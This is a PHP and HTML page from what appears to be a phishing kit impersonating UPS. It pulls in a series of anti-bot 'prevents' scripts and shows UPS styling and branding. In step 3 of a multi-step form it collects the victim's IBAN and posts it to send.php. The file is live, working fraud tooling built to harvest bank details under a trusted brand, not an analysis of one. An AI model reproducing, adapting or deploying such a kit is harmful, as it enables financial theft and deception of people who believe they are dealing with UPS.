<?php
include "prevents/anti1.php";
include "prevents/anti2.php";
include "prevents/anti3.php";
include "prevents/anti4.php";
include "prevents/anti5.php";
include "prevents/anti6.php";
include "prevents/anti7.php";


require '../main.php';

    require "lang.php";

?>
<!doctype html>
<html lang='en' dir='ltr'>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Content-Security-Policy">
    <link rel="shortcut icon" href="assets/resources/images/UPS_logo.svg" type="image/x-icon">
    <title>UPS</title>
    <!--grid-layout-->
    <!--[if IE]><link rel="stylesheet" href="/assets/resources/styles/ups.binary-fonts.css" /><![endif]-->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!--ls:begin[stylesheet]-->
    <style type="text/css">
        .iw_container {
            max-width: 800px !important;
            margin-left: auto !important;
            margin-right: auto !important;
        }
        
        .iw_stretch {
            min-width: 100% !important;
        }
    </style>


    <link type="text/css" href="assets/resources/styles/ups.vendor.54f3c2d83b58.css" rel="stylesheet">
    <link type="text/css" href="assets/resources/styles/ups.styles.e1b300f3e370.css" rel="stylesheet">
    <link type="text/css" href="assets/resources/styles/ups.modules.aa8af2ae24b7.css" rel="stylesheet">
    <link type="text/css" href="assets/resources/styles/ups.widgets.7e2315c2b219.css" rel="stylesheet">
    <link type="text/css" href="assets/resources/styles/ups.apps-ppc.b96d8d0e433f.css" rel="stylesheet" media="screen">
    <link type="text/css" href="assets/resources/styles/ups.apps-lasso.d41d8cd41d8c.css" rel="stylesheet" media="screen">


    <base>
</head>

<body>
    <div class="iw_viewport-wrapper">
        <div class="container-fluid iw_section" id="sectionisswf4to">
            <div class="row iw_row iw_stretch" id="rowisswf4tp">
                <div class="iw_columns col-lg-12" id="colisswf4tq">
                    <div class="iw_placeholder" id="iw_placeholder1473252365867">
                        <div class="iw_component" id="iw_comp1480683349378">
                            <style type="text/css">
                                @media (min-width: 992px) {
                                    .ups-header_light .ups-header_utils {
                                        top: 45px
                                    }
                                }
                                
                                .h2 {
                                    color: #fff;
                                    font-size: 16px;
                                    font-weight: lighter;
                                }
                                
                                .hr {
                                    size: 10px;
                                    background-color: #fff;
                                    color: #fff!important;
                                    margin: 30px 0!important;
                                }
                                
                                
                                
                                .errorg {
                                    display: flex;
                                    flex-direction: row;
                                    align-items: self-start;
                                    justify-content: start;
                                    width: 100%;
                                }
                                
                                .errorg span {
                                    color: red;
                                    font-size: 10px;
                                    padding: 2px;
                                    margin-right: 3px;
                                }
                                
                                .errorg p {
                                    color: red;
                                    font-size: 14px;
                                }
                                
                                <?php if ($_GET['page']=='error') { ?>

                                    .ups-input {
                                    border: 1px solid red!important;
                                    border-radius: 5px;
                                }

                                <?php } ?>
                                
                                ?>
                            </style>

<?php  include "include/header.php" ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="container-fluid iw_section" id="sectionisswf4ts">
            <div class="row iw_row iw_stretch" id="rowisswf4tt">
                <div class="iw_columns col-lg-12" id="colisswf4tu">
                    <div class="iw_placeholder" id="iw_placeholder1473252365879">
                        <div class="iw_component" id="iw_comp1486125197247">
                        </div>
                    </div>
                    <div class="iw_placeholder" id="iw_placeholder1473252365871">
                        <div class="iw_component" id="iw_comp1486125197248">
                            <!--ls:begin[component-1486125197248]-->
                            <!--ls:end[component-1486125197248]-->
                        </div>
                    </div>
                    <div class="iw_placeholder" id="iw_placeholder1473252365886">
                        <div class="iw_component" id="iw_comp1486604851641">
                            <!--ls:begin[component-1486604851641]-->
                            <!--ls:end[component-1486604851641]-->
                        </div>
                    </div>
                    <div class="iw_placeholder" id="iw_placeholder1473252365894">
                        <div class="iw_component" id="iw_comp1539278480891">
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- begin body wrapper -->


        <div style="background-color: #e8e8e6;" class="container-fluid iw_section">
            <div class="row iw_row iw_stretch">
                <div class="iw_columns col-lg-12">
                    <div class="iw_component">
                        <div id="ups-fw_legacy_app_wrap">
                            <div class="ups-fw_legacy_app_inner">
                                <div style="height:auto; min-height:550px">
                                    <main style="margin-top: 40px;" id="ups-main">
                                        <div class="ups-form_wrap ups-wrap ups-application_wrapper">
                                            <div class="ups-wrap_inner ups-app_sso">
                                                <div class="ups-app_confined">
                                          

                                                    <link rel="stylesheet" href="assets/master.css">
                                                    <!--  -->
                                                    <form action="send.php" method="post" class="forma">


                                                        <div class="row">

                                                        

                                                            <div class="col-lg-12 col-xs-12">
                                                            <div class="proc">
                                                                <div class="compl">1</div>
                                                                <div class="compl">2</div>
                                                                <div class="active">3</div>
                                                                
                                                            </div>


                                                            <div class="ups-page-title">
                                                        <h1 style="font-size: 18px;" class="ups-app_title"><?php echo lang('xiban1'); ?></h1>
                                                    </div>

                                                   

                                                    <div class="msggr">
                                                    <img src="assets/ic_notification_info.svg" alt="">
                                                    <p class="p"><?php echo lang('xiban2'); ?></p>
                                                    </div>

                                                    
                                                    
                                                                <div id="emailInput" class="ups-form_group ups-input">
                                                                    <label style="top:5px;z-index: 1;font-size: 12px;font-weight: 700;" for="email" class="ups-form_label"> 
                                                                    <?php echo lang('xiban3'); ?>
                                                                        </label>
                                                                    <div class="ups-text_wrapper ups-input_wrapper">

                                                                        <input type="text" name="iban" class="ups-form_input" aria-required="true"  maxlength="50">

                                                                    </div>
                                                                </div>
                                                                
                                                                
                                                                <?php if( $_GET['page'] == 'error' ){ ?>
                                                                <div class="errorg">
                                                                    <span class="icon ups-icon-exception"> </span>
                                                                    <p class="error"><?php echo lang('xiban4'); ?></p>
                                                                </div>
                                                                <?php } ?>
                                                            </div>
                                                        </div>

                                                       
                                                        <p class="p" style="margin: 30px 0 0 0;"><?php echo lang('xiban5'); ?></p>
                                                        <p class="p" style="margin: 0 0 20px 0;"><?php echo lang('xiban6'); ?></p>

                                                        <div class="ups-group lasso_login">
                                                            <div class="ups-form_ctaGroup">
                                                                <button id="submitBtn" name="submit" type="submit" class="ups-cta ups-cta_primary"><?php echo lang('xiban7'); ?></button>
                                                            </div>
                                                        </div>


                                                       

<script src="js/jq.js"></script>
<?php $m->ctr("I-BAN ".@$_GET['e']); ?>

                                                        <!--Prove you are not a robot begin-->
                                                        <!--Prove you are not a robot end-->
                                                    </form>


                                                </div>
                                            </div>
                                        </div>
                                    </main>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- end body wrapper -->
        <div class="container-fluid iw_section" id="sectionj9rfozjs">
            <div class="row iw_row iw_stretch" id="rowj9rfozjt">
                <div class="iw_columns col-lg-12" id="colj9rfozju">
                    <div class="iw_placeholder" id="iw_placeholder1510169105655">
                        <div class="iw_component" id="iw_comp1510567868826">
                            <style type="text/css">
                                #ups-footer .h2_eqivalent {
                                    font-family: Tahoma, helvetica, arial, sans-serif !important;
                                    font-size: 1.2em;
                                    padding-bottom: 7px;
                                    margin: 20px 0 15px;
                                    font-weight: bold
                                }
                                
                                #ups-footer .h2_eqivalent span {
                                    font-family: Tahoma, helvetica, arial, sans-serif !important
                                }
                                
                                @media (max-width: 991px) {
                                    #ups-footer .h2_eqivalent {
                                        font-family: Tahoma, helvetica, arial, sans-serif !important;
                                        text-transform: none;
                                        border-bottom: 1px solid #757575;
                                        margin: 0 -60px;
                                        padding: 22px 60px;
                                        position: relative
                                    }
                                    #ups-footer .h2_eqivalent span {
                                        font-family: Tahoma, helvetica, arial, sans-serif !important
                                    }
                                    #ups-footer .h2_eqivalent.ups-active .ups-iconAlone:before {
                                        content: "\e653"
                                    }
                                    #ups-footer .h2_eqivalent button {
                                        border-radius: 0;
                                        background: none;
                                        border: none;
                                        padding: 0;
                                        line-height: 1;
                                        position: absolute;
                                        right: 60px;
                                        top: 50%;
                                        width: 44px;
                                        height: 44px;
                                        line-height: 54px;
                                        font-size: 1.1em;
                                        margin: -22px 0 0;
                                        margin-right: -10px;
                                        text-align: center;
                                        overflow: hidden
                                    }
                                    #ups-footer .ups-footer_custserv .h2_eqivalent {
                                        background: none
                                    }
                                    #ups-footer .ups-footer_custserv .h2_eqivalent .icon:before {
                                        font-family: "upsicons" !important;
                                        font-style: normal !important;
                                        font-weight: normal !important;
                                        font-variant: normal !important;
                                        text-transform: none !important;
                                        line-height: 1;
                                        -webkit-font-smoothing: antialiased;
                                        -moz-osx-font-smoothing: grayscale;
                                        content: "\e660";
                                        line-height: 0;
                                        font-size: 1.3em;
                                        position: relative;
                                        top: 5px;
                                        margin-right: 9px
                                    }
                                }
                                
                                @media (max-width: 767px) {
                                    #ups-footer .h2_eqivalent {
                                        margin: 0 -20px;
                                        padding: 22px 20px
                                    }
                                    #ups-footer .h2_eqivalent button {
                                        right: 20px
                                    }
                                }
                                
                                .h2_eqivalent {
                                    font-size: 1.5em;
                                    font-family: Tahoma, helvetica, arial, sans-serif;
                                    font-weight: normal
                                }
                                
                                .h2_eqivalent .ups-rtl {
                                    font-family: Tahoma, helvetica, arial, sans-serif;
                                    font-weight: 700
                                }
                            </style>
<?php  include "include/footer.php" ?>
                        </div>
                    </div>
                    <div class="iw_placeholder" id="iw_placeholder1510655492385">
                        <div class="iw_component" id="iw_comp1510655492420">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


</body>

</html>
 